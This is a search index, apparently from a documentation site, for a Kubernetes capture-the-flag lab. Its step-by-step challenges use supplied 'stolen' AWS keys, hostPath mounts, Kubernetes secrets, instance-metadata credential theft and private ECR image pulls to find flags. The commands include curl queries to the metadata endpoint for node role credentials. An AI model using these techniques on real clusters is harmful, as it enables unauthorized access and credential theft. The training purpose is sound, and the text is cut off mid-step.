{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Kubernetes Security Village","text":"<p>Welcome to the Hackers Teaching Hackers (HTH) 2024 Kubernetes Security Village.</p> <p></p> <p>The Kubernetes Security Village explores a few of the attacker techniques covered by the Microsoft Threat Matrix for Kubernetes.</p> <ul> <li>Initial Access - Techniques used to gain a foothold inside the Kubernetes cluster</li> <li>Execution - Techniques used to execute code on the cluster</li> <li>Persistence - Techniques used to maintain long term access to the cluster</li> <li>Privilege Escalation - Techniques used to gain a higher level of access within the cluster</li> <li>Defense Evasion - Techniques used to avoid detection by security controls</li> <li>Credential Access - Techniques used to steal credentials from the cluster</li> <li>Discovery - Techniques used to gather information about the cluster</li> <li>Lateral Movement - Techniques used to move laterally within the cluster</li> <li>Collection - Techniques used to gather data from the cluster</li> <li>Impact - Techniques used to disrupt the cluster</li> </ul> <p></p>"},{"location":"#prerequisites","title":"Prerequisites","text":"<p>Before you can start the Kubernetes Security village, the following command line interface tools must be installed on your machine.</p>"},{"location":"#aws-command-line-interface","title":"AWS Command Line Interface","text":"<ol> <li> <p>Follow the Installing or updating to the latest version of the AWS CLI instructions.</p> </li> <li> <p>Verify the AWS CLI is installed correctly by running the following command in your Terminal:</p> <pre><code>aws --version\n</code></pre> <p>Expected Output</p> <pre><code>aws-cli/2.2.18 Python/3.12.7 Darwin/23.6.0 source/arm64\n</code></pre> </li> </ol>"},{"location":"#kubectl-command-line-interface","title":"Kubectl Command Line Interface","text":"<ol> <li> <p>Follow the kubectl install tools instructions.</p> </li> <li> <p>In your Terminal, run the following commands to verify the command line tools are installed correctly before moving forward:</p> <pre><code>kubectl version --client\n</code></pre> <p>Expected Output</p> <pre><code>Client Version: v1.31.2\nKustomize Version: v5.4.2\n</code></pre> </li> </ol>"},{"location":"#docker","title":"Docker","text":"<ol> <li> <p>Follow the Installing Docker Engine instructions.</p> </li> <li> <p>Verify the Docker CLI is installed correctly by running the following command in your Terminal:</p> <pre><code>docker --version\n</code></pre> <p>Expected Output</p> <pre><code>Docker version 26.1.1, build 4cf5afa\n</code></pre> </li> </ol>"},{"location":"#getting-started","title":"Getting Started","text":"<p>Start by visiting the Kubernetes Security Village table. Your village hosts, Eric Johnson and Eric Mead, will provide you with a set of stolen AWS access keys to simulate a compromise. From there, it is up to you to gain Initial Access to the Kubernetes cluster and discover the flags hidden in the environment.</p>"},{"location":"airborneio-24/","title":"Airborneio 24 Challenge","text":"<p>The Airborneio 24 challenge requires you to find a flag located on the Kubernetes node's file system. Without direct access to the file system and a view only Kubernetes role, you will need to find a misconfiguration in an existing resource to gain access to the flag.</p>"},{"location":"airborneio-24/#host-path-mount-misconfiguration","title":"Host Path Mount Misconfiguration","text":"<p>Pods often need to store data on the file system as processes execute. Kubernetes supports many different volume types. The Kubernetes hostPath volume mount provides persisted storage for a pod using a directory on the host node's filesystem. Often the most simple way to gain persisted storage, the host path mount can be a powerful attack vector for privilege escalation.</p> <p>Review the pod configurations in the <code>hth</code> namespace. Which pod is using a hostPath mount configuration? What directory on the host node's filesystem is being mounted into the pod?</p> Hint <ul> <li> <p>List the pods running in the <code>hth</code> namespace. Make a note of the api pod's name, as you will need this in the next step.</p> <pre><code>kubectl get pods -n hth\n</code></pre> <p>Expected Output</p> <pre><code>NAME            READY   STATUS    RESTARTS   AGE\napi-randomid    1/1     Running   0          2d21h\nui-randomid     1/1     Running   0          2d21h\n</code></pre> </li> <li> <p>Describe the configuration for each pod using the <code>kubectl describe pod</code> command. Search the output for the pod that has a Volume with a Type set to HostPath. The volume's Path is pointing to a directory on the node's file system that will be accessible from inside a pod running in the cluster.</p> <pre><code>kubectl describe pod -n hth ENTER_API_POD_NAME \n</code></pre> <p>Expected Output</p> <pre><code>Volumes:\n  hth:\n    Type:          HostPath (bare host directory volume)\n    Path:          ?????\n    HostPathType:  DirectoryOrCreate\n</code></pre> </li> <li> <p>The same pod will have a Mount referencing the hth volume. The mount will specify  that specifies the directory inside the container.</p> <p>Expected Output</p> <pre><code>Mounts:\n  ????? from hth (ro)\n  /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-rgfww (ro)\n</code></pre> </li> </ul> Answer <ul> <li> <p>With this knowledge, you have discovered a host path mount attack path to get from a compromised api pod to the node's filesystem.</p> <pre><code>Pod: api-randomid\nPod Mount Location: /mnt/hth/\nHost Path Location: /opt/data/hth\n</code></pre> </li> </ul>"},{"location":"airborneio-24/#host-path-mount-privilege-escalation","title":"Host Path Mount Privilege Escalation","text":"<p>Given a scenario where the pod is compromised, an attacker can use the hostPath volume mount to gain unauthorized access data on the Kubernetes node. Use the <code>kubectl exec</code> command to obtain a shell on the compromised pod and exfiltrate the <code>airborneio-24</code> flag from the Kubernetes node's filesystem.</p> Hint <ul> <li> <p>Use the <code>kubectl exec</code> command to obtain a shell on the compromised pod.</p> <pre><code>kubectl exec --stdin --tty -n hth ENTER_API_POD_NAME -- /bin/bash\n</code></pre> <p>Expected Output</p> <pre><code>root@api-randomid:/#\n</code></pre> </li> <li> <p>Once inside the pod, list the contents of the mount location.</p> <pre><code>ls -l ?????\n</code></pre> <p>Expected Output</p> <pre><code>total 0\ndrwxr-xr-x. 2 root root 68 Nov  8 23:03 api\ndrwxr-xr-x. 2 root root 27 Nov  8 23:03 secrets\n</code></pre> </li> <li> <p>List the contents of the directory to find the <code>airborneio-24</code> flag.</p> <pre><code>ls -l ?????/secrets/\n</code></pre> <p>Expected Output</p> <pre><code>-rw-r--r--. 1 root root 42 Nov  8 23:03 airborneio-24\n</code></pre> </li> <li> <p>Use the <code>cat</code> command to read the contents of the <code>airborneio-24</code> file and retrieve the flag.</p> </li> <li> <p>Run the following command to exit the shell and return to your local machine.</p> <pre><code>exit\n</code></pre> </li> </ul> Answer <ul> <li> <p>The <code>airborneio-24</code> flag is located in the <code>/mnt/hth/secrets</code> directory on the container's filesystem.</p> <pre><code>cat /mnt/hth/secrets/airborneio-24\n</code></pre> <p>Expected Output</p> <pre><code>hth{?????}\n</code></pre> </li> </ul>"},{"location":"airborneio-24/#next-challenge","title":"Next Challenge","text":"<p>Congratulations! You have identified a host path mount misconfiguration and exfiltrated the Airborneio 24 flag from the Kubernetes node's file system.</p> <p>Continue to the Shadowhawk Challenge to learn how Kubernetes pods can inherit permissions from the underlying Kubernetes node.</p>"},{"location":"api-key/","title":"API Key Challenge","text":"<p>The API Key Challenge challenge requires you to find a flag stored as a Kubernetes Secret. Unfortunately, the kubeace-maverick IAM user does not have permissions to list secrets. Without this permission, you will need to find the pod using the secret, identify the secret name, and access the secret directly.</p>"},{"location":"api-key/#kubernetes-secret-configuration","title":"Kubernetes Secret Configuration","text":"<p>Kubernetes secrets are often used to store sensitive information, such as passwords, API keys, and private keys, and feed those secrets into a pod as an environment variable or a volume mount. Kubernetes secrets are defined for a pod using the container specification's volume or an  environment variable.</p> <p>To exfiltrate the secret, you will need to find the name of the secret first. Review the pod specifications in the <code>hth</code> namespace. Which pod is referencing a Kubernetes secret? What is the name of the secret?</p> Hint <ul> <li> <p>List the pods running in the <code>hth</code> namespace.</p> <pre><code>kubectl get pods -n hth\n</code></pre> <p>Expected Output</p> <pre><code>NAME            READY   STATUS    RESTARTS   AGE\napi-randomid    1/1     Running   0          2d21h\nui-randomid     1/1     Running   0          2d21h\n</code></pre> </li> <li> <p>Use the <code>kubectl describe pod</code> command to view each pod's configuration. Review the Volumes and Environment configurations to identify any secrets being used. Observe that one pod is referencing a Kubernetes secret in an environment variable called AVIATA_API_KEY.</p> <pre><code>kubectl describe pod -n hth ENTER_POD_NAME\n</code></pre> <p>Expected Output</p> <pre><code>Environment:\n  AVIATA_API_KEY:  &lt;set to the key 'value' in secret '?????'&gt;  Optional: false\n</code></pre> </li> <li> <p>Note the name of the secret referenced in the pod's environment variable. You will need the name to exfiltrate the flag.</p> </li> </ul> Answer <ul> <li> <p>The <code>ui-random-id</code> pod is referencing a Kubernetes secret named <code>ui-api-key</code> in an environment variable called AVIATA_API_KEY.</p> <p>Expected Output</p> <pre><code>Environment:\n  AVIATA_API_KEY:  &lt;set to the key 'value' in secret 'ui-api-key'&gt;  Optional: false\n</code></pre> </li> </ul>"},{"location":"api-key/#kubernetes-secret-exfiltration","title":"Kubernetes Secret Exfiltration","text":"<p>Now that you have identified the Kubernetes secret name, use <code>kubectl</code> read the Kubernetes API Key secret and decode the flag.</p> Hint <ul> <li> <p>Use the <code>kubectl get secret</code> command to read the secret. Observe the output confirms that the secret exists, but does not display the secret's value.</p> <pre><code>kubectl get secret -n hth ?????\n</code></pre> <p>Expected Output</p> <pre><code>NAME         TYPE     DATA   AGE\n?????        Opaque   1      4d18h\n</code></pre> </li> <li> <p>Run the Use <code>kubectl get secret</code> command again using the output (-o) option to format the response as YAML or JSON. This will display the secret's value in base64 encoding.</p> <pre><code>kubectl get secret -n hth ????? -o json\n</code></pre> <p>Expected Output</p> <pre><code>{\n  \"apiVersion\": \"v1\",\n  \"data\": {\n      \"value\": \"?????\"\n  },\n  \"kind\": \"Secret\",\n  \"metadata\": {\n      \"creationTimestamp\": \"2024-11-08T23:19:54Z\",\n      \"name\": \"?????\",\n      \"namespace\": \"hth\",\n      \"resourceVersion\": \"6084\",\n      \"uid\": \"84fb5c38-1604-4bb3-a06f-0599b7f832d4\"\n  },\n  \"type\": \"Opaque\"\n}\n</code></pre> </li> <li> <p>Base64 decode the secret's <code>value</code> to reveal the flag.</p> <pre><code>echo \"?????\" | base64 -d\n</code></pre> </li> </ul> Answer <p>Run the following command to decode the secret's value and reveal the flag.</p> <pre><code>kubectl get secret -n hth ui-api-key -o json | jq -r .data.value | base64 -d\n</code></pre> <p>Expected Output</p> <pre><code>hth{?????}\n</code></pre>"},{"location":"api-key/#next-challenge","title":"Next Challenge","text":"<p>Congratulations! You have successfully located the API Key Kubernetes secret being used by the UI pod. Then, decoded the value to reveal the flag.</p> <p>Continue to the Cascadia Cockpit Voice Recorders (CVR) Challenge to learn how the Kubernetes node is authenticating to the private container registry and pulling images.</p>"},{"location":"cascadia-cvr/","title":"Cascadia Cockpit Voice Recorders (CVR)","text":"<p>The Cascadia Cockpit Voice Recorders (CVR) challenge requires you to find a flag stored in a private Elastic Container Registry (ECR) image. Unfortunately, the kubeace-maverick IAM user does not have permissions to pull images from the ECR repository. Without direct access to ECR, you will need to use the AWS Instance Metadata Service IMDS to escalate your AWS permissions and pull the private image from ECR.</p>"},{"location":"cascadia-cvr/#pod-permission-inheritance","title":"Pod Permission Inheritance","text":"<p>During the Shadowhawk Challenge, you learned that pods can escalate permissions by calling the node's instance metadata service (IMDS),  the permissions of the service account associated with the pod. In the Cascadia Cockpit Voice Recorders (CVR) challenge, you will need to use that privilege escalation technique again to access the private container image stored in the Elastic Container Registry (ECR).</p> <ol> <li> <p>Using your Terminal, verify that kubeace-maverick IAM user does not have access to describe the ECR repositories in the AWS account hosting the EKS cluster. What error message is returned?</p> Hint <p>Run <code>aws ecr describe-repositories</code> command to list the ECR repositories in the AWS account.</p> <pre><code>aws ecr describe-repositories\n</code></pre> Answer <p>The describe repositories command will return an unauthorized error because the kubeace-maverick IAM user does not have access to the ECR repositories in the account.</p> <p>Expected Output</p> <pre><code>An error occurred (AccessDeniedException) when calling the DescribeRepositories operation: User: arn:aws:iam::123456789012:user/kubeace-maverick-randomid is not authorized to perform: ecr:DescribeRepositories on resource: arn:aws:ecr:us-west-2:123456789012:repository/* because no identity-based policy allows the ecr:DescribeRepositories action\n</code></pre> </li> <li> <p>Use the Instance Metadata API attacker technique again to obtain temporary credentials from the node. Use the <code>kubectl exec</code> command to obtain a shell on the <code>ui</code> pod and exfiltrate credentials from the node's instance metadata service (IMDS). What is the name of the IAM role attached to the Kubernetes node? What IMDS endpoint can read temporary credentials for the IAM role?</p> Hint <ul> <li> <p>List the pods running in the <code>hth</code> namespace. Make a note of the ui pod's name, as you will need this in the next step.</p> <pre><code>kubectl get pods -n hth\n</code></pre> <p>Expected Output</p> <pre><code>NAME            READY   STATUS    RESTARTS   AGE\napi-randomid    1/1     Running   0          2d21h\nui-randomid     1/1     Running   0          2d21h\n</code></pre> </li> <li> <p>Use the <code>kubectl exec</code> command to obtain a shell on the <code>ui</code> pod.</p> <pre><code>kubectl exec --stdin --tty -n hth ENTER_UI_POD_NAME -- /bin/bash\n</code></pre> <p>Expected Output</p> <pre><code>root@ui-randomid:/#\n</code></pre> </li> <li> <p>Once inside the pod, query the IMDS endpoint (169.254.169.254) to view the list of IAM roles with security credentials on the node.</p> <pre><code>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ &amp;&amp; echo;\n</code></pre> </li> <li> <p>Use the role's name to view the role's temporary security credentials. Make a note of the AccessKeyId, SecretAccessKey, and Token values for the next step.</p> <pre><code>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/?????/ &amp;&amp; echo;\n</code></pre> <p>Expected Output</p> <pre><code>{\n  ...\n  \"Type\" : \"AWS-HMAC\",\n  \"AccessKeyId\" : \"?????\",\n  \"SecretAccessKey\" : \"?????\",\n  \"Token\" : \"?????\",\n  ...\n}\n</code></pre> </li> <li> <p>Run the following command to exit the shell and return to your local machine.</p> <pre><code>exit\n</code></pre> </li> </ul> Answer <p>The AWS IAM Role attached to the Kubernetes node is hth-node-role-randomid. Which tells you that the command to obtain temporary credentials is...</p> <pre><code>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/hth-node-role-randomid/\n</code></pre> </li> </ol>"},{"location":"cascadia-cvr/#private-registry-image-access","title":"Private Registry Image Access","text":"<p>The Private Registry Images attacker technique uses credentials stored on the Kubernetes node to gain unauthorized access to container image repositories. Image pull credentials can be used to access a private container repository, but the cloud provider's each have a their own recommended authentication process.</p> <p>Use the node's temporary credentials to pull the private image from the account's ECR repository exfiltrate the Cascadia CVR flag from ECR.</p> <ol> <li> <p>Open a new Terminal on your machine and set the required AWS CLI environment variables to use the node's temporary credentials. What is the name of the ECR repository and URL that contains the <code>cascadia</code> flag.</p> Hint <ul> <li> <p>Make sure you open a new Terminal session. Then, set each of the following environment variables to the configure the new Terminal session. Replace the <code>NODE_ROLE_ACCESS_KEY_ID</code>, <code>NODE_ROLE_SECRET_ACCESS_KEY</code>, and <code>NODE_ROLE_SESSION_TOKEN</code> placeholders with the values obtained from the previous step.</p> <pre><code>export AWS_ACCESS_KEY_ID=ENTER_NODE_ROLE_ACCESS_KEY_ID\nexport AWS_SECRET_ACCESS_KEY=ENTER_NODE_ROLE_SECRET_ACCESS_KEY\nexport AWS_SESSION_TOKEN=ENTER_NODE_ROLE_SESSION_TOKEN\nexport AWS_DEFAULT_REGION=us-west-2\n</code></pre> </li> <li> <p>Run the <code>aws sts get-caller-identity</code> command to verify you have properly configured the IAM role's temporary credentials. The output should show you are authenticating as the node's EC2 instance profile role.</p> <pre><code>aws sts get-caller-identity\n</code></pre> <p>Expected Output</p> <pre><code>{\n  \"UserId\": \"AROASZY2ZSU65B7QQKFEP:i-0304eb3fda5d5c44d\",\n  \"Account\": \"123456789012\",\n  \"Arn\": \"arn:aws:sts::123456789012:assumed-role/hth-node-role-random-id/i-0304eb3fda5d5c44d\"\n}\n</code></pre> </li> <li> <p>List all of the ECR repositories in the account. The output will show one container repository that contains the cascadia flag. Make a note of the repositoryUri value for the next step.</p> <pre><code>aws ecr describe-repositories\n</code></pre> <p>Expected Output</p> <pre><code>{\n  \"repositories\": [\n    {\n        \"repositoryArn\": \"arn:aws:ecr:us-west-2:123456789012:repository/hth-api-randomid\",\n        \"registryId\": \"123456789012\",\n        \"repositoryName\": \"?????\",\n        \"repositoryUri\": \"?????\",\n        \"createdAt\": \"2024-11-13T18:58:33.370000-05:00\",\n        \"imageTagMutability\": \"MUTABLE\",\n        \"imageScanningConfiguration\": {\n          \"scanOnPush\": false\n        },\n        \"encryptionConfiguration\": {\n          \"encryptionType\": \"AES256\"\n        }\n      }\n    ]\n}\n</code></pre> </li> </ul> Answer <p>The ECR repository that contains the <code>cascadia</code> flag is hth-api-randomid.</p> <p>Expected Output</p> <pre><code>\"repositoryName\": \"hth-api-randomid\",\n\"repositoryUri\": \"123456789012.dkr.ecr.us-west-2.amazonaws.com/hth-api-randomid\",\n</code></pre> </li> <li> <p>Use the <code>aws ecr list-images</code> command to enumerate the images in the ECR repository. What is the name of the image and tag that contains the cascadia flag?</p> Hint <ul> <li> <p>Run the <code>aws ecr list-images</code> command to list the images in the ECR repository. Make a note of the imageTag value for the next step.</p> <pre><code>aws ecr list-images --repository-name ?????\n</code></pre> <p>Expected Output</p> <pre><code>{\n  \"imageIds\": [\n    {\n      \"imageDigest\": \"sha256:?????\",\n      \"imageTag\": \"?????\"\n    }\n  ]\n}\n</code></pre> </li> </ul> Answer <p>The list images command confirms an image with a tag value of cascadia exists in the hth-api-randomid ECR repository.</p> <p>Expected Output</p> <pre><code>\"imageDigest\": \"sha256:?????\",\n\"imageTag\": \"cascadia\"\n</code></pre> </li> <li> <p>Use the <code>aws ecr get-login-password</code> command to authenticate to the ECR repository. Then, use the repositoryUri and imageTag values to pull the private image from the ECR repository. What is the size of the <code>cascadia</code> image?</p> Hint <ul> <li> <p>Run the <code>aws ecr get-login-password</code> command to obtain an authentication token for the ECR repository and pass the token to the <code>docker login</code> command. You need to set the <code>accountid</code> and <code>region</code> placeholders with the values from the previous steps.</p> <pre><code>aws ecr get-login-password | docker login --username AWS --password-stdin accountid.dkr.ecr.region.amazonaws.com\n</code></pre> </li> <li> <p>Use the <code>docker pull</code> command to pull the <code>cascadia</code> image from the ECR repository. You need to set the repositoryUri and imageTag placeholders with the values from the previous steps.</p> <pre><code>docker pull repositoryUri:imageTag\n</code></pre> </li> <li> <p>Run the <code>docker images</code> command to verify the image was downloaded to your machine and see the image size.</p> </li> </ul> Answer <p>The commands to sign into the ECR repository and pull the image are as follows. Remember, you will need to replace the AWS account id, region, and randomid placeholder values in your command.</p> <pre><code>aws ecr get-login-password | docker login --username AWS --password-stdin accountid.dkr.ecr.region.amazonaws.com\ndocker pull accountid.dkr.ecr.region.amazonaws.com/hth-api-randomid\ndocker images | grep cascadia\n</code></pre> <p>Expected Output</p> <pre><code>REPOSITORY                                      TAG       IMAGE ID       CREATED        SIZE\n123456789012.dkr.ecr.region.amazonaws.com/hth-api-randomid                  cascadia             5cdf199d2874   8 hours ago     131MB\n</code></pre> </li> <li> <p>Run the <code>docker save</code> command to save the <code>cascadia</code> image as a tar file on your machine. Extract the tar file and search the image layers for the <code>CASCADIA_CVR_KEY</code> flag.</p> Hint <ul> <li> <p>Run the <code>docker save</code> command to save the <code>cascadia</code> image as a tar file on your machine. You need to set the repositoryUri and imageTag placeholders with the values from the previous steps.</p> <pre><code>docker save repositoryUri:imageTag &gt; /path/to/cascadia.tar\n</code></pre> </li> <li> <p>Extract the tar file and search the image layers for the <code>cascadia</code> flag.</p> <pre><code>tar -xvf /path/to/cascadia.tar -C /path/to/directory\ncd /path/to/directory\ngrep -r \"CASCADIA\"\n</code></pre> </li> </ul> <p>Expected Output</p> <pre><code>\"CASCADIA_CVR_KEY=hth{?????}\n</code></pre> </li> </ol>"},{"location":"cascadia-cvr/#conclusion","title":"Conclusion","text":"<p>You have successfully completed the Cascadia Cockpit Voice Recorders (CVR) challenge. You used the Instance Metadata API to escalate your permissions and access the private ECR repository. You then used the credentials to gain access to the Cascadia private image, extract the image layers, and search for a hard-coded secret stored in an environment variable.</p> <p>Congratulations! You have completed the Hackers Teaching Hackers 2024 Kubernetes Security Village.</p>"},{"location":"initial-access/","title":"Kubernetes Initial Access","text":"<p>Microsoft's Threat Matrix for Kubernetes highlights a number of Initial Access techniques used by attackers to compromise a cluster. One of the techniques, documented as Using cloud credentials, occurs when cloud credentials are stolen or unintentionally leaked.</p>"},{"location":"initial-access/#aws-cli-configuration","title":"AWS CLI Configuration","text":"<p>The AWS Command Line Interface (CLI) provides programmatic access to the AWS service APIs. To gain access to the AWS Elastic Kubernetes Cluster (EKS), you need to configure the AWS CLI to use the stolen credentials that you received from the village hosts. Set the required AWS CLI environment variables to use the stolen credentials. What is the name of the compromised AWS principal?</p> Hint <ul> <li> <p>The AWS CLI checks several locations for credentials when authenticating to the AWS APIs. This includes a local configuration file (~/.aws/credentials), environment variables, and the instance metadata service when running inside an AWS process (EC2, Lambda, etc.). Set the <code>AWS_ACCESS_KEY_ID</code>, <code>AWS_SECRET_ACCESS_KEY</code>, and <code>AWS_DEFAULT_REGION</code> environment variables to the stolen credentials.</p> <pre><code>export AWS_ACCESS_KEY_ID=STOLEN_ACCESS_KEY\nexport AWS_SECRET_ACCESS_KEY=STOLEN_SECRET_KEY\nexport AWS_DEFAULT_REGION=STOLEN_REGION\n</code></pre> </li> <li> <p>The AWS Security Token Service (STS) has a GetCallerIdentity that returns details about the IAM user or role calling the API. Use the <code>aws sts get-caller-identity</code> command to retrieve the compromised principal's name and AWS account id.</p> <pre><code>aws sts get-caller-identity\n</code></pre> <p>Expected Output</p> <pre><code>{\n  \"UserId\": \"AIDA2ZCFBDI7W52ZHQYQ7\",\n  \"Account\": \"123456789012\",\n  \"Arn\": \"arn:aws:iam::123456789012:user/?????\"\n}\n</code></pre> </li> </ul> Answer <ul> <li> <p>The compromised principal's name is in the Arn field in the output, which identifies an IAM user named kubeace-maverick followed by a random identifier.</p> <pre><code>kubeace-maverick-randomid\n</code></pre> </li> </ul>"},{"location":"initial-access/#aws-eks-initial-access","title":"AWS EKS Initial Access","text":"<p>Amazon's Elastic Kubernetes Service (EKS) is a managed Kubernetes service that makes it simple to run Kubernetes on AWS without needing to install, configure, and maintain your own Kubernetes control plane. EKS is integrated with many AWS services, including the Identity and Access Management (IAM) service.</p> <p>With the appropriate EKS access entry and permissions, AWS principals can configure <code>kubectl</code> to authenticate directly to the EKS cluster.</p> <ol> <li> <p>Use the AWS CLI to search the AWS account for EKS clusters. What is the name of the EKS cluster that you need to access?</p> Hint <ul> <li> <p>The <code>aws eks list-clusters</code> command lists the EKS clusters in the specified AWS account.</p> <pre><code>aws eks list-clusters\n</code></pre> <p>Expected Output</p> <pre><code>{\n  \"clusters\": [\n    \"?????\"\n  ]\n}\n</code></pre> </li> </ul> Answer <ul> <li> <p>The EKS cluster you need to access is named hth-eks-cluster.</p> <pre><code>hth-eks-cluster\n</code></pre> </li> </ul> </li> <li> <p>Use AWS CLI to update your machine's kubeconfig file and access the EKS cluster. What Kubernetes group(s) is the compromised AWS principal a member of?</p> Hint <ul> <li> <p>The <code>aws eks update-kubeconfig</code> command updates the <code>~/.kube/config</code> file with details <code>kubectl</code> needs to authenticate to the <code>hth-eks-cluster</code> cluster.</p> <pre><code>aws eks update-kubeconfig --name hth-eks-cluster\n</code></pre> <p>Expected Output</p> <pre><code>Updated context arn:aws:eks:us-west-2:123456789012:cluster/hth-eks-cluster in /Users/user/.kube/config\n</code></pre> </li> <li> <p>Similar to the <code>aws sts get-caller-identity</code> command, <code>kubectl</code> has its own command that returns details about the authenticated user. Use the <code>kubectl auth whoami</code> command to view the compromised principal's group memberships.</p> <pre><code>kubectl auth whoami\n</code></pre> <p>Expected Output</p> <pre><code>ATTRIBUTE                                              VALUE\nUsername                                               kubeace-maverick-randomid\nUID                                                    aws-iam-authenticator:123456789012:AIDA2ZCFBDI7W52ZHQYQ7\nGroups                                                 [?????]\nExtra: accessKeyId                                     [AKIA2ZCFBDI74CS5EG5L]\nExtra: arn                                             [arn:aws:iam::123456789012:user/kubeace-maverick-randomid]\nExtra: canonicalArn                                    [arn:aws:iam::123456789012:user/kubeace-maverick-randomid]\nExtra: principalId                                     [AIDA2ZCFBDI7W52ZHQYQ7]\nExtra: sessionName                                     []\nExtra: sigs.k8s.io/aws-iam-authenticator/principalId   [AIDA2ZCFBDI7W52ZHQYQ7]\n</code></pre> </li> </ul> Answer <ul> <li> <p>The compromised principal is a member of the hth-data-viewers and system:authenticated groups. Based on the name of the first group (<code>hth-data-viewers</code>), it is likely that the principal has read-only access to data inside the cluster.</p> <p>Expected Output</p> <pre><code>Groups [hth-data-viewers system:authenticated]\n</code></pre> </li> </ul> </li> <li> <p>Use <code>kubectl</code> to list the namespaces in the Kubernetes cluster. Which namespace do you think contains the hth data?</p> Hint <ul> <li> <p>Run the <code>kubectl get namespaces</code> command to list the namespaces in the EKS cluster.</p> <pre><code>kubectl get namespaces\n</code></pre> <p>Expected Output</p> <pre><code>NAME                STATUS   AGE\namazon-cloudwatch   Active   5d18h\ncalico-system       Active   5d17h\ncert-manager        Active   5d17h\ndefault             Active   5d18h\ngatekeeper-system   Active   5d17h\n?????               Active   5d17h\nkube-node-lease     Active   5d18h\nkube-public         Active   5d18h\nkube-system         Active   5d18h\ntigera-operator     Active   5d17h\n</code></pre> </li> </ul> Answer <ul> <li> <p>The hth namespace contains the Kubernetes resources that are viewable by members of the hth-data-viewers group.</p> <p>Expected Output</p> <pre><code>hth                 Active   5d17h\n</code></pre> </li> </ul> </li> </ol>"},{"location":"initial-access/#village-challenges","title":"Village Challenges","text":"<p>Now that you have successfully gained access to the EKS cluster using the compromised AWS credentials, it is time to start elevating privileges inside the cluster and exfiltrating HTH data. Navigate to the Airborneio-24 Challenge to find the first flag.</p>"},{"location":"shadowhawk/","title":"Shadowhawk Challenge","text":"<p>The Shadowhawk challenge requires you to find a flag located in the AWS Simple Storage Service (S3). Unfortunately, the kubeace-maverick IAM user does not have permissions to the AWS S3 API. Without direct access to S3, you will need to use the AWS Instance Metadata Service IMDS to escalate your AWS permissions and gain access to the flag.</p>"},{"location":"shadowhawk/#pod-permission-inheritance","title":"Pod Permission Inheritance","text":"<p>Cloud managed Kubernetes services (AWS EKS, Azure AKS, and Google's GKE) typically create Kubernetes node(s) using the cloud provider's virtual machine service. Each node usually needs cloud permissions to read private container images and create network interfaces, load balancers, and other network components for connecting Kubernetes ingress and service resources. These permissions can be granted to the cloud virtual machine using an AWS IAM Role, Azure Managed Identity, or Google Service account attached to the virtual machine. It is important to realize that pods running on the node also inherit these permissions.</p> <p>Pods running on the node may also need access to cloud resources such as storage, secrets, and backend databases. These permissions are often granted to the node's service account, which means that any pod running on the node inherits all of these permissions.</p> <p>Attackers gaining access to an EKS cluster will attempt to discover service account credentials using the Instance Metadata API attacker technique. By default, this technique can allow a pod running on the node to communicate with the node's instance metadata service (IMDS), retrieve temporary instance profile credentials, and potentially escalate permissions.</p> <ol> <li> <p>Using your Terminal, verify that kubeace-maverick IAM user does not have access to list the S3 buckets in the AWS account hosting the EKS cluster. What error message is returned?</p> Hint <p>Run <code>aws s3api list-buckets</code> command to list the S3 buckets in the AWS account.</p> <pre><code>aws s3api list-buckets\n</code></pre> Answer <p>The list buckets command will return an unauthorized error because the kubeace-maverick IAM user does not have access to list the S3 buckets in the account.</p> <p>Expected Output</p> <pre><code>An error occurred (AccessDenied) when calling the ListBuckets operation: User: arn:aws:iam::123456789012:user/kubeace-maverick-randomid is not authorized to perform: s3:ListAllMyBuckets because no identity-based policy allows the s3:ListAllMyBuckets action\n</code></pre> </li> <li> <p>Given a scenario where the <code>ui</code> pod is compromised, an attacker can use the Instance Metadata API attacker technique to obtain temporary credentials from the node. Use the <code>kubectl exec</code> command to obtain a shell on the <code>ui</code> pod and exfiltrate credentials from the node's instance metadata service (IMDS). What is the name of the IAM role attached to the Kubernetes node? What IMDS endpoint can read temporary credentials for the IAM role?</p> Hint <ul> <li> <p>List the pods running in the <code>hth</code> namespace. Make a note of the ui pod's name, as you will need this in the next step.</p> <pre><code>kubectl get pods -n hth\n</code></pre> <p>Expected Output</p> <pre><code>NAME            READY   STATUS    RESTARTS   AGE\napi-randomid    1/1     Running   0          2d21h\nui-randomid     1/1     Running   0          2d21h\n</code></pre> </li> <li> <p>Use the <code>kubectl exec</code> command to obtain a shell on the <code>ui</code> pod.</p> <pre><code>kubectl exec --stdin --tty -n hth ENTER_UI_POD_NAME -- /bin/bash\n</code></pre> <p>Expected Output</p> <pre><code>root@ui-randomid:/#\n</code></pre> </li> <li> <p>Once inside the pod, query the IMDS endpoint (169.254.169.254) to view the list of IAM roles with security credentials on the node.</p> <pre><code>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ &amp;&amp; echo;\n</code></pre> </li> <li> <p>Use the role's name to view the role's temporary security credentials. Make a note of the AccessKeyId, SecretAccessKey, and Token values for the next step.</p> <pre><code>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/?????/ &amp;&amp; echo;\n</code></pre> <p>Expected Output</p> <pre><code>{\n  ...\n  \"Type\" : \"AWS-HMAC\",\n  \"AccessKeyId\" : \"?????\",\n  \"SecretAccessKey\" : \"?????\",\n  \"Token\" : \"?????\",\n  ...\n}\n</code></pre> </li> <li> <p>Run the following command to exit the shell and return to your local machine.</p> <pre><code>exit\n</code></pre> </li> </ul> Answer <p>The AWS IAM Role attached to the Kubernetes node is hth-node-role-randomid. Which tells you that the command to obtain temporary credentials is...</p> <pre><code>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/hth-node-role-randomid/\n</code></pre> </li> </ol>"},{"location":"shadowhawk/#pod-privilege-escalation","title":"Pod Privilege Escalation","text":"<p>With the Kubernetes node's temporary instance profile credentials in hand, use those credentials to exfiltrate the Shadowhawk flag from S3. Open a new Terminal on your machine and set the required AWS CLI environment variables to use the node's temporary credentials. Then, use the AWS CLI to find the flag.</p> <ol> <li> <p>Set the required AWS CLI environment variables to use the node's temporary credentials. What is the name of the S3 bucket that contains the <code>shadowhawk</code> flag.</p> Hint <ul> <li> <p>Make sure you open a new Terminal session. Then, set each of the following environment variables to the configure the new Terminal session. Replace the <code>NODE_ROLE_ACCESS_KEY_ID</code>, <code>NODE_ROLE_SECRET_ACCESS_KEY</code>, and <code>NODE_ROLE_SESSION_TOKEN</code> placeholders with the values obtained from 